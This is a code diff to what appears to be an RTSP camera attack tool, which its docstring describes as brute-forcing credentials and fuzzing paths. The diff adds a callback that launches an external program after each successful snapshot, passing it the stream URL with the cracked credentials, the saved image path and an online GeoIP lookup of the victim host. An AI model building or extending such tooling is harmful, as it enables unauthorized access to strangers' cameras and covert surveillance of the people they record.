@@ -8,7 +8,7 @@ from fire import Fire
 
 from lib.rtsp import capture_image, rtsp_req
 from lib.scan import process_each
-from lib.utils import dt, str_to_filename, tmof_retry, interruptable
+from lib.utils import dt, geoip_str_online, str_to_filename, tmof_retry, interruptable
 
 verbose_level = 0
 
@@ -47,7 +47,7 @@ def wrire_result(stream_url: str):
 
 @interruptable
 @tmof_retry
-def capture(stream_url, prefer_ffmpeg=False):
+def capture(stream_url, prefer_ffmpeg=False, capture_callback=None):
     from urllib.parse import urlparse
 
     up = urlparse(stream_url)
@@ -58,11 +58,16 @@ def capture(stream_url, prefer_ffmpeg=False):
 
     captured = capture_image(stream_url, img_path, prefer_ffmpeg)
 
+    if captured and capture_callback:
+        import subprocess
+        subprocess.Popen([capture_callback, stream_url,
+                          img_path, geoip_str_online(up.hostname)])
+
     prg(C_CAP_OK if captured else C_CAP_ERR)
 
 
 @interruptable
-def check_host(netloc, pl, paths, creds, rtsp_port, timeout, single_path_enough, single_cred_enough, interface, capture_img, prefer_ffmpeg):
+def check_host(netloc, pl, paths, creds, rtsp_port, timeout, single_path_enough, single_cred_enough, interface, capture_img, prefer_ffmpeg, capture_callback):
     # test some cases that cannot be valid as netloc
     if '/' in netloc:
         print('Can\'t use', netloc, 'as target')
@@ -115,7 +120,7 @@ def check_host(netloc, pl, paths, creds, rtsp_port, timeout, single_path_enough,
                 if verbose_level < 0:
                     print(c_url)
                 if capture_img:
-                    capture(c_url, prefer_ffmpeg)
+                    capture(c_url, prefer_ffmpeg, capture_callback)
 
             if single_cred_enough:
                 break
@@ -124,7 +129,7 @@ def check_host(netloc, pl, paths, creds, rtsp_port, timeout, single_path_enough,
             return
 
 
-def main(hosts_file=None, p=554, t=5, ht=64, i=None, capture=False, v=0, s=False, P=None, C=None, sp=False, sc=True, ff=False):
+def main(hosts_file=None, p=554, t=5, ht=64, i=None, capture=False, v=0, s=False, P=None, C=None, sp=False, sc=True, ff=False, capture_callback=None):
     """Brute creds, fuzzing paths for RTSP cams
 
     :param str hosts_file: File with lines ip:port or just ips
@@ -160,7 +165,7 @@ def main(hosts_file=None, p=554, t=5, ht=64, i=None, capture=False, v=0, s=False
     with open(hosts_file or os.path.join(LOCAL_DIR, f'hosts_{p}.txt')) as f:
         hosts = (ln.rstrip() for ln in f)
         process_each(check_host, hosts, ht, paths,
-                     creds, p, t, sp, sc, i, capture, ff)
+                     creds, p, t, sp, sc, i, capture, ff, capture_callback)
 
 
 if __name__ == "__main__":
